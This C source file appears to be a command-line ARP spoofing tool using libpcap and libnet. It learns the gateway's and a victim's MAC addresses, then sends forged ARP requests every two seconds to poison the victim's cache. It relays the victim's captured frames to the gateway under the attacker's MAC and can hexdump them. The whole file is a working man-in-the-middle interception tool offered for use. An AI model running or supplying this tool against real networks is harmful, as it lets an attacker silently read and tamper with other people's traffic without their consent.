#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <libnet.h>
#include <stdlib.h>
#include <sys/ioctl.h> 
#include <pthread.h>
#include <unistd.h>

#define ether_len  14
#define BUF_SIZE 65536
#define padding_size 18;

char errbuf[PCAP_ERRBUF_SIZE];
pcap_t *handle;

u_int8_t my_mac[6];
u_int8_t victim_mac[6];
u_int8_t gateway_mac[6];
int check = 0;
bool show_check = 0;

typedef struct
{
#define ARPHRD_NETROM   0   /* from KA9Q: NET/ROM pseudo */
#define ARPHRD_ETHER    1   /* Ethernet 10Mbps */
#define ARPHRD_EETHER   2   /* Experimental Ethernet */
#define ARPHRD_AX25     3   /* AX.25 Level 2 */
#define ARPHRD_PRONET   4   /* PROnet token ring */
#define ARPHRD_CHAOS    5   /* Chaosnet */
#define ARPHRD_IEEE802  6   /* IEEE 802.2 Ethernet/TR/TB */
#define ARPHRD_ARCNET   7   /* ARCnet */
#define ARPHRD_APPLETLK 8   /* APPLEtalk */
#define ARPHRD_LANSTAR  9   /* Lanstar */
#define ARPHRD_DLCI     15  /* Frame Relay DLCI */
#define ARPHRD_ATM      19  /* ATM */
#define ARPHRD_METRICOM 23  /* Metricom STRIP (new IANA id) */
#define ARPHRD_IPSEC    31  /* IPsec tunnel */
#define ARPOP_REQUEST    1  /* req to resolve address */
#define ARPOP_REPLY      2  /* resp to previous request */
#define ARPOP_REVREQUEST 3  /* req protocol address given hardware */
#define ARPOP_REVREPLY   4  /* resp giving protocol address */
#define ARPOP_INVREQUEST 8  /* req to identify peer */
#define ARPOP_INVREPLY   9  /* resp identifying peer */
	u_int16_t ar_hrd;         /* format of hardware address */
	u_int16_t ar_pro;         /* format of protocol address */
	u_int8_t  ar_hln;         /* length of hardware address */
	u_int8_t  ar_pln;         /* length of protocol addres */
	u_int16_t ar_op;          /* operation type */
	u_int8_t sender_mac[6];
	u_int8_t sender_ip[4];
	u_int8_t target_mac[6];
	u_int8_t target_ip[4];
} arp_header;

unsigned char *get_macaddr(char *ether) {
	int fd;
	struct ifreq ifr;
	char *iface = ether;
	unsigned char *mac;
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
	ioctl(fd, SIOCGIFHWADDR, &ifr);
	close(fd);

	mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
	return mac;

}

void pcap_setting(char *argv[]) {
	handle = pcap_open_live(argv[1], BUF_SIZE, 1, 100, errbuf); // MAX recv byte, promis(1-every,0-me), time out
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", argv[1], errbuf);
		exit(0);
	}
	struct bpf_program fp;
	char filter_exp[] = ""; //arp || icmp || tcp
	bpf_u_int32 net;
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) { // filtering
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		exit(0);
	}
	if (pcap_setfilter(handle, &fp) == -1) { // filtering apply
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		exit(0);
	}
}

int arp_packet_send(char *mac, char *sender, char *target) { //
	struct libnet_ethernet_hdr eth;
	arp_header arp;
	// dynamic alloc
	int header_size = sizeof(libnet_ethernet_hdr) + sizeof(arp_header) + padding_size; //42 + 18
																					   //printf("size : %d\n", header_size);
	u_int8_t *packet = (u_int8_t*)malloc(sizeof(u_int8_t)*header_size);
	memset(packet, 0, header_size);

	// ethernet packet struct //
	memset(eth.ether_dhost, 0xff, 6);
	memcpy(eth.ether_shost, my_mac, 6);
	eth.ether_type = htons(ETHERTYPE_ARP);
	memcpy(packet, &eth, sizeof(libnet_ethernet_hdr));

	// arp packet struct //
	arp.ar_hrd = htons(ARPHRD_ETHER);
	arp.ar_pro = htons(ETHERTYPE_IP);
	arp.ar_hln = 0x06;
	arp.ar_pln = 0x04;
	arp.ar_op = htons(ARPOP_REQUEST);
	// arp mac, ip struct //
	memset(arp.target_mac, 0x00, 6);
	memcpy(arp.sender_mac, my_mac, 6);
	inet_pton(AF_INET, sender, arp.sender_ip);
	inet_pton(AF_INET, target, arp.target_ip);
	memcpy(packet + sizeof(libnet_ethernet_hdr), &arp, sizeof(arp_header));

	for (int i = 0; i < header_size; i++) {
		//printf("%02x ", packet[i]);
	} //printf("\n");

	if (pcap_sendpacket(handle, (const unsigned char*)packet, header_size) != 0) {
		fprintf(stderr, "\n[p]Error : %s\n", pcap_geterr(handle));
	}
}

void *send_arp_thread(void *argv)
{
	char **argvs = ((char**)argv);
	//printf("%s ", argvs[1]);
	while (1) {
		if (check == 2)
			arp_packet_send(argvs[1], argvs[2], argvs[3]);
		sleep(2); // 2 seconds send
	}
}

int ip_check(unsigned int value, u_int8_t *value2) {
	int cnt = 0;
	u_int8_t temp[4];
	temp[0] = (unsigned int)value & 0x000000FF;
	temp[1] = ((unsigned int)value & 0x0000FF00) >> 8;
	temp[2] = ((unsigned int)value & 0x00FF0000) >> 16;
	temp[3] = ((unsigned int)value & 0xFF000000) >> 24;
	for (int i = 0; i < 4; i++) {
		if (temp[cnt] == value2[cnt]) {
			cnt++;
		}
	}
	if (cnt == 4) {
	printf("get ip\n");
	return 1;
	}else {
		return 0;
	}
}

int check_mac(const unsigned char *pkt_data, char* src, unsigned char* des) {
	if (pkt_data[21] == 2) { // arp recv
		struct libnet_ethernet_hdr *ethz = (struct libnet_ethernet_hdr*)pkt_data;
		arp_header *arp = (arp_header*)(pkt_data + 14);
		unsigned int value = inet_addr(src);
		if (ip_check(value, arp->sender_ip) == 1) {
			memcpy(des, ethz->ether_shost, 6);
			return 1;
		}
		return 0;
	}
}


void packet_show(const unsigned char* packet, int len)
{
	int i;
	for (i = 0; i < len; i++) {
		if (i % 16 == 0 && i != 0) {
			printf("  ");
			for (int j = -16; j <= -1; j++) {
				if (j == -8)
					printf("  ");
				if (isprint(*(packet + i + j)))
					printf("%c", *(packet + i + j));
				else
					printf(".");
			}
			printf("\n");
		}
		if (i % 8 == 0)
			printf("  ");
		printf("%02x ", *(packet + i));
	}
	for (i = 0; i<16 - (len % 16); i++) {
		printf("   ");
		if (i % 8 == 0)
			printf("  ");
	}
	for (int i = (len / 16) * 16; i<len; i++) {
		if (i % 8 == 0 && i % 16 != 0)
			printf("  ");
		if (isprint(*(packet + i)))
			printf("%c", *(packet + i));
		else
			printf(".");
	}
	printf("\n");
}


void parser(char **argvs) {
	//sleep(1);
	struct pcap_pkthdr *headers;
	const unsigned char *pkt_data = NULL;

	struct libnet_ethernet_hdr *ethz;
	struct libnet_ipv4_hdr *ipv4;
	struct libnet_tcp_hdr *tcph;
	int res = 0;
	while (1) {
		arp_packet_send(argvs[1], argvs[3], argvs[2]);
		res = pcap_next_ex(handle, &headers, &pkt_data);
		if (res < 0) {
			fprintf(stderr, "pcap_next_ex error");
			break;
		}
		if (res == 0) {
			printf("timeout! \n");
			continue;
		}
		if (check_mac(pkt_data, argvs[2], gateway_mac) == 1) {
			break;
		}
	}
	while (1) {
		arp_packet_send(argvs[1], argvs[2], argvs[3]);
		res = pcap_next_ex(handle, &headers, &pkt_data);
		if (res < 0) {
			fprintf(stderr, "pcap_next_ex error");
			break;
		}
		if (res == 0) {
			printf("timeout! \n");
			continue;
		}
		if (check_mac(pkt_data, argvs[3], victim_mac) == 1) {
			check = 2;
			break;
		}
	}
	while (1) {
		res = pcap_next_ex(handle, &headers, &pkt_data);
		if (res < 0) {
			fprintf(stderr, "pcap_next_ex error");
			break;
		}
		if (res == 0) {
			//printf("timeout! \n");
			continue;
		}
		if (check == 2 && pkt_data[21] != 2 && pkt_data[21] != 1) {
			ethz = (struct libnet_ethernet_hdr*)pkt_data;
			if (memcmp((const void *)ethz->ether_shost, (const void *)victim_mac, 6) == 0) {
				memcpy(ethz->ether_dhost, gateway_mac, 6); // destination : gateway change
				memcpy(ethz->ether_shost, my_mac, 6); // source : my_mac 
				if (pcap_sendpacket(handle, (const unsigned char*)pkt_data, headers->len) != 0) {
					printf("send error");
				}
				if(show_check == 1) packet_show(pkt_data, headers->len);
			}
		}
	}
}

void *rcv_send_thread(void *argv)
{
	char **argvs = ((char**)argv);
	parser(argvs);
}

int main(int argc, char *argv[]) {
	pthread_t pthread_arp_send;
	pthread_t pthread_rcv_send;
	int thr_id[2]; // error check variable
	int status;

	if (argc < 4) {  // argv exception
		fprintf(stderr, " send_arp <interface> <sender ip> <target ip> \t\n example : send_arp ens1 192.168.0.1 192.168.0.9\n example : send_arp ens1 192.168.0.1 192.168.0.9 -show\n");
		exit(0);
	}
	if (argc == 5 && (strcmp(argv[4], "-show") == 0)) show_check = 1;

	memcpy((char*)my_mac, get_macaddr(argv[1]), 6); // my_amc alloc
	pcap_setting(argv); // pcap lib open

	thr_id[0] = pthread_create(&pthread_arp_send, NULL, send_arp_thread, argv);
	if (thr_id[0] < 0)
	{
		perror("thread create error : ");
		exit(0);
	}

	thr_id[1] = pthread_create(&pthread_rcv_send, NULL, rcv_send_thread, argv);
	if (thr_id[1] < 0)
	{
		perror("thread create error : ");
		exit(0);
	}

	pthread_join(pthread_arp_send, (void **)&status);

	return 0;
}
